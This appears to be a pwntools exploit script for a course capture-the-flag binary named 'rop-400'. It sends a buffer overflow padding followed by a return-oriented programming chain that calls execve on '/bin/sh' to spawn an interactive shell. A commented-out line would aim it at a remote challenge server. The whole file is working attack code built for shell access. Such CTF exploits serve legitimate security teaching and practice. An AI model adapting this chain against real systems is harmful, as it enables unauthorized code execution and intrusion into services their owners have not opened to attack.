#!/usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["tmux", "split-window", "-h", "-p 65"]
)

def start(binary):
    gs = '''
        init-pwndbg
        b *0x401325
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote()
    else:
        return process(binary)

def exploit(p,e,r):

    pad = b'A' * 40
    #pad = b'PrintLogo\x00' * 4
    
    pop_rax = p64(0x40117a)
    pop_rdi = p64(0x401183)
    pop_rsi = p64(0x40118c)
    pop_rdx = p64(0x401195)

    binsh = p64(next(e.search(b'/bin/sh\x00')))
    syscall = p64(0x40119e)


    chain = pop_rax + p64(59)
    chain += pop_rdi + binsh
    chain += pop_rsi + p64(0)
    chain += syscall
    p.sendline(pad+chain)
    p.interactive()


if __name__=="__main__":
    file = './rop-400'


    p = start(file)
    #p = remote("cse4830-rop-400.chals.io", 443, ssl=True, sni="cse4830-rop-400.chals.io")
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
